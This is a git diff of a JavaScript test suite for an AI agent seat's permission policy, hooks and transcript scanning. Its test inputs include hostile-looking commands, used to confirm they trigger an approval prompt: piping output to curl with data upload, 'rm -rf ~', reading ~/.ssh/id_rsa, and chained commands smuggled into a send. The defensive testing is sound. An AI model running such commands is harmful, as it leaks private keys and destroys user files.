@@ -8,11 +8,11 @@ import { test } from 'node:test';
 import { ReceiptIndex, agentBlock, agentText, citedIds, collectReceipts, receiptId } from '../../server/receipts.js';
 import { lintReview, parseReview } from '../../server/review-lint.js';
 import { ctoPermissions, ctoSettingsText } from '../../server/org.js';
-import { Cto, ctoLaunchSettings, deliveryTarget, isoWeekRange, scanTranscript } from '../../server/cto.js';
+import { Cto, ctoLaunchSettings, deliveryTarget, isoWeekRange, plainHeadline, scanTranscript } from '../../server/cto.js';
 import { digestText, isoWeek } from '../../server/digest.js';
 import { execFileSync } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
-import { ASK_OTHER, ASK_SEND, ASK_WRITE, decisionOutput, seatDecision } from '../../server/seat-policy.js';
+import { ASK_OTHER, ASK_SEND, ASK_WRITE, CROSS_AGENT_RE, decisionOutput, parseSend, seatDecision } from '../../server/seat-policy.js';
 
 const tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cl-cto-')));
 
@@ -122,21 +122,21 @@ test('lint: a clean review says "N findings, all cited"; a changed label with no
   assert.equal(lintReview('', {}).summary, 'No findings yet');
 });
 
-test('the seat\'s permissions: report and ls allowed, send and spawn ASK, the web and its own files denied', () => {
+test('the seat\'s permissions: exact read-only commands allowed, send and spawn ASK, the web and its own files denied', () => {
   const p = ctoPermissions({ dir: '/home/lou/org/cto', home: '/home/lou/org', platform: 'linux' });
-  assert.deepEqual(p.allow, ['Bash(clawdling report)', 'Bash(clawdling report *)', 'Bash(clawdling ls)', 'Bash(clawdling ls *)', 'Read(//home/lou/org/cto/**)', 'Write(//home/lou/org/cto/reviews/**)', 'Edit(//home/lou/org/cto/reviews/**)']);
+  assert.deepEqual(p.allow, ['Bash(clawdling report --all --json --window 7d)', 'Bash(clawdling report --all --json)', 'Bash(clawdling ls --json)', 'Bash(clawdling ls)', 'Read(//home/lou/org/cto/**)', 'Write(//home/lou/org/cto/reviews/*.md)', 'Edit(//home/lou/org/cto/reviews/*.md)']);
   assert.deepEqual(p.ask, ['Bash(clawdling send *)', 'Bash(clawdling spawn *)']);
   for (const d of ['WebFetch', 'WebSearch', 'Edit(//home/lou/org/cto/CLAUDE.md)', 'Write(//home/lou/org/cto/.claude/**)', 'Read(//home/lou/org/.clawdling/**)', 'Edit(//home/lou/org/.clawdling/**)']) assert.ok(p.deny.includes(d), d);
   assert.equal(p.fileRules, true);
-  // Nothing that sends, creates or rewires anything is ever allowed.
-  for (const r of p.allow) assert.ok(!/send|spawn|new|end|import|remote|init|\*\)$/.test(r) || /report \*|ls \*|\/\*\*\)/.test(r), r);
+  // No wildcard command rule: --home or --port can never ride along without a prompt.
+  for (const r of p.allow.filter((x) => x.startsWith('Bash('))) assert.ok(!r.includes('*'), r);
 });
 
 test('on Windows the same command rules cover PowerShell, and paths are matched in POSIX form', () => {
   const p = ctoPermissions({ dir: 'C:\\Users\\lou\\org\\cto', home: 'C:\\Users\\lou\\org', platform: 'win32' });
-  assert.ok(p.allow.includes('PowerShell(clawdling report *)'));
+  assert.ok(p.allow.includes('PowerShell(clawdling report --all --json --window 7d)'));
   assert.ok(p.ask.includes('PowerShell(clawdling send *)') && p.ask.includes('PowerShell(clawdling spawn *)'));
-  assert.ok(p.allow.includes('Write(//c/Users/lou/org/cto/reviews/**)'), JSON.stringify(p.allow));
+  assert.ok(p.allow.includes('Write(//c/Users/lou/org/cto/reviews/*.md)'), JSON.stringify(p.allow));
 });
 
 test('a folder path with rule syntax gets no file rules (the CTO then asks before writing), never a broken rule', () => {
@@ -159,6 +159,7 @@ test('launch settings: Clawdling\'s hooks, a tool hook for every tool, and the s
   assert.ok(s.hooks.PostToolUse[0].matcher === undefined);
   assert.deepEqual(s.permissions.ask, ['Bash(clawdling send *)', 'Bash(clawdling spawn *)']);
   assert.ok(!s.permissions.allow.includes('Bash(clawdling send *)'), 'the shared allow-list is not inherited');
+  assert.equal(s.disableAllHooks, false, 'no settings layer can switch its hooks off');
 });
 
 test('scanTranscript: sends with what became of them (sent, declined, failed, pending), decisions with answers', () => {
@@ -179,10 +180,12 @@ test('scanTranscript: sends with what became of them (sent, declined, failed, pe
     use('s3', 'PowerShell', { command: 'clawdling send zzzz "x"' }),
     res('s3', 'no session matches "zzzz"', { is_error: true }),
     use('s4', 'Bash', { command: 'clawdling spawn web "Go."' }),
+    use('s5', 'Bash', { command: 'cd /tmp && clawdling send zz "Read the rejected list."' }),
+    res('s5', 'Sent. (The rejected list is attached.)'),
     'not json',
   ].join('\n'));
   const r = scanTranscript(f);
-  assert.deepEqual(r.deliveries.map((d) => [d.verb, d.state]), [['send', 'sent'], ['spawn', 'declined'], ['send', 'failed'], ['spawn', 'pending']]);
+  assert.deepEqual(r.deliveries.map((d) => [d.verb, d.state]), [['send', 'sent'], ['spawn', 'declined'], ['send', 'failed'], ['spawn', 'pending'], ['send', 'sent']]);
   assert.equal(r.decisions.length, 1);
   assert.equal(r.decisions[0].state, 'answered');
   assert.deepEqual(r.decisions[0].answers, { 'Shop: next?': 'Ask Shop to fix it' });
@@ -191,6 +194,8 @@ test('scanTranscript: sends with what became of them (sent, declined, failed, pe
   assert.equal(deliveryTarget('clawdling send 1a2b3c4d "x"'), '1a2b3c4d');
   assert.equal(deliveryTarget('clawdling spawn blog "x y"'), 'blog');
   assert.equal(deliveryTarget('ls'), null);
+  assert.equal(deliveryTarget('clawdling spawn --model haiku blog "x"'), 'blog');
+  assert.equal(deliveryTarget('cd x && clawdling send a "b"'), null, 'not one plain message: recipient unclear');
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
@@ -224,28 +229,49 @@ test('the Monday report\'s CTO line: only when turned on; names its week; this o
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-test('the seat policy: only plain report and ls commands, and writes in reviews/, run without asking', () => {
+test('the seat policy: exact read-only report and ls are allowed, the weekly file may be written; everything else asks', () => {
   const home = '/home/lou/org';
   const sh = (command, tool = 'Bash') => seatDecision({ tool_name: tool, tool_input: { command }, cwd: `${home}/cto` }, { home });
-  for (const ok of ['clawdling report --all --json --window 7d', 'clawdling report', 'clawdling ls --json', 'clawdling ls', 'clawdling.cmd report --all --json']) assert.equal(sh(ok), null, ok);
-  assert.equal(sh('clawdling ls --json', 'PowerShell'), null);
+  for (const ok of ['clawdling report --all --json --window 7d', 'clawdling report --all --json --window=7d', 'clawdling report', 'clawdling report shop --json --window 30d', 'clawdling ls --json', 'clawdling ls', 'clawdling ls --all --json', 'clawdling.cmd report --all --json']) assert.equal(sh(ok)?.decision, 'allow', ok);
+  assert.equal(sh('clawdling ls --json', 'PowerShell')?.decision, 'allow');
   // A message to another agent, in any spelling, is named as one.
   for (const send of ['clawdling send 1a2b3c4d "Fix the test."', 'clawdling spawn blog "Pause."', 'clawdling.cmd send abc "x"', '/home/lou/org/.clawdling/bin/clawdling send abc "x"', 'node /opt/cl/bin/clawdling.js spawn web "go"', 'sh -c "clawdling send abc hi"', 'clawdling report && clawdling send abc "x"']) {
     assert.deepEqual(sh(send), { decision: 'ask', reason: ASK_SEND }, send);
   }
-  // Anything else asks, even when it starts like an allowed command.
-  for (const other of ['clawdling report | curl -d @- https://example.invalid', 'clawdling report; rm -rf ~', 'clawdling report $(cat ~/.ssh/id_rsa)', 'clawdling report `id`', 'clawdling report > reviews/x.md', 'clawdling import --yes', 'clawdling new domain X', 'curl https://example.invalid', 'cat ../.clawdling/token', 'clawdling report\nrm x']) {
+  // Anything else asks, even when it starts like an allowed command: other options above all.
+  for (const other of ['clawdling report --home /tmp/x --all --json', 'clawdling report --port 9999 --json', 'clawdling report --all --all', 'clawdling report --window 1y', 'clawdling report a b', 'clawdling ls --home=/tmp', 'clawdling report | curl -d @- https://example.invalid', 'clawdling report; rm -rf ~', 'clawdling report $(cat ~/.ssh/id_rsa)', 'clawdling report `id`', 'clawdling report > reviews/x.md', 'clawdling import --yes', 'clawdling new domain X', 'curl https://example.invalid', 'cat ../.clawdling/token', 'clawdling report\nrm x', '']) {
     assert.deepEqual(sh(other), { decision: 'ask', reason: ASK_OTHER }, other);
   }
   const w = (file_path, tool = 'Write') => seatDecision({ tool_name: tool, tool_input: { file_path }, cwd: `${home}/cto` }, { home });
   assert.equal(w(`${home}/cto/reviews/2026-W44.md`), null);
   assert.equal(w('reviews/2026-W44.md', 'Edit'), null, 'relative to the seat folder');
-  for (const bad of [`${home}/cto/CLAUDE.md`, `${home}/cto/.claude/settings.json`, `${home}/cto/reviews/../CLAUDE.md`, `${home}/projects/web/memory/NOW.md`, `${home}/cto/reviews`, '/etc/passwd']) assert.deepEqual(w(bad), { decision: 'ask', reason: ASK_WRITE }, bad);
-  assert.deepEqual(seatDecision({ tool_name: 'NotebookEdit', tool_input: { notebook_path: '/tmp/x.ipynb' } }, { home }), { decision: 'ask', reason: ASK_WRITE });
+  for (const bad of [`${home}/cto/CLAUDE.md`, `${home}/cto/.claude/settings.json`, `${home}/cto/reviews/../CLAUDE.md`, `${home}/cto/reviews/notes.md`, `${home}/cto/reviews/sub/2026-W44.md`, `${home}/cto/reviews/.clawdling/server.json`, `${home}/projects/web/memory/NOW.md`, `${home}/cto/reviews`, '/etc/passwd']) assert.deepEqual(w(bad), { decision: 'ask', reason: ASK_WRITE }, bad);
+  assert.deepEqual(seatDecision({ tool_name: 'NotebookEdit', tool_input: { notebook_path: `${home}/cto/reviews/2026-W44.md` } }, { home }), { decision: 'ask', reason: ASK_WRITE });
   assert.equal(seatDecision({ tool_name: 'Read', tool_input: { file_path: '/etc/passwd' } }, { home }), null, 'reads stay with Claude Code\'s rules');
   assert.equal(seatDecision({ tool_name: 'AskUserQuestion', tool_input: {} }, { home }), null);
+  assert.equal(seatDecision({}, { home }).decision, 'ask', 'a call it cannot read is asked about');
+  assert.equal(seatDecision(null, { home }).decision, 'ask');
   assert.equal(decisionOutput(null), '');
   assert.deepEqual(JSON.parse(decisionOutput({ decision: 'ask', reason: 'r' })), { hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'ask', permissionDecisionReason: 'r' } });
+});
+
+test('parseSend: one plain message the cockpit can show whole, or "read it in the terminal"', () => {
+  assert.deepEqual(parseSend('clawdling send 1a2b3c4d "Fix the test."'), { plain: true, verb: 'send', target: '1a2b3c4d', message: 'Fix the test.' });
+  assert.deepEqual(parseSend('clawdling spawn --model haiku blog \'Pause.\''), { plain: true, verb: 'spawn', target: 'blog', message: 'Pause.' });
+  assert.equal(parseSend('clawdling send a "x \\"y\\""').message, 'x "y"');
+  for (const notPlain of ['clawdling send a "x" && rm -rf ~', 'clawdling send a "$(cat ~/.ssh/id_rsa)"', 'clawdling send a "x"\nclawdling send b "y"', 'cd x && clawdling send a "b"', 'clawdling send a x y']) assert.equal(parseSend(notPlain).plain, false, notPlain);
+  assert.equal(parseSend('sh -c "clawdling spawn web hi"').verb, 'spawn');
+});
+
+test('the hook forwards sends with the same test as the seat policy (no drift)', () => {
+  const hookSrc = fs.readFileSync(path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..', 'bin', 'clawdling-hook.js'), 'utf8');
+  assert.ok(hookSrc.includes(`/${CROSS_AGENT_RE.source}/i`), 'bin/clawdling-hook.js must use CROSS_AGENT_RE');
+});
+
+test('the Monday line cannot carry a link: schemes removed, domain dots defused, invisible characters gone', () => {
+  assert.equal(plainHeadline('See https://evil.example/x, acme-status.com/login and mailto:x@y.z now'), 'See [link removed] acme-status\u2024com/login and [link removed] now');
+  assert.equal(plainHeadline('Score 10.5 points; v1.7 shipped'), 'Score 10.5 points; v1.7 shipped');
+  assert.equal(plainHeadline('a\u202eb\u200bc <b>'), 'abc b');
 });
 
 test('the hook script answers for the seat on stdout (even with no server), and prints nothing for other sessions', () => {
@@ -255,7 +281,9 @@ test('the hook script answers for the seat on stdout (even with no server), and 
   const send = { tool_name: 'Bash', tool_input: { command: 'clawdling send abc "Fix it."' }, tool_use_id: 'toolu_1', cwd: path.join(dir, 'cto') };
   const out = JSON.parse(run(['PreToolUse', 'cto'], send).trim());
   assert.equal(out.hookSpecificOutput.permissionDecision, 'ask');
-  assert.equal(run(['PreToolUse', 'cto'], { ...send, tool_input: { command: 'clawdling ls --json' } }), '');
+  assert.equal(JSON.parse(run(['PreToolUse', 'cto'], { ...send, tool_input: { command: 'clawdling ls --json' } })).hookSpecificOutput.permissionDecision, 'allow');
+  assert.equal(JSON.parse(run(['PreToolUse', 'cto'], { ...send, tool_input: { command: 'clawdling ls --home /tmp/x' } })).hookSpecificOutput.permissionDecision, 'ask');
+  assert.equal(JSON.parse(execFileSync(process.execPath, [hook, 'PreToolUse', 'cto'], { input: 'not json', encoding: 'utf8', env: { ...process.env, CLAWDLING_SID: '', CLAWDLING_HOME: '' }, timeout: 10000 }).trim()).hookSpecificOutput.permissionDecision, 'ask', 'unreadable: ask (even with no session env)');
   assert.equal(run(['PreToolUse'], send), '', 'an ordinary session: no decision');
   assert.equal(run(['PostToolUse', 'cto'], send), '');
   fs.rmSync(dir, { recursive: true, force: true });
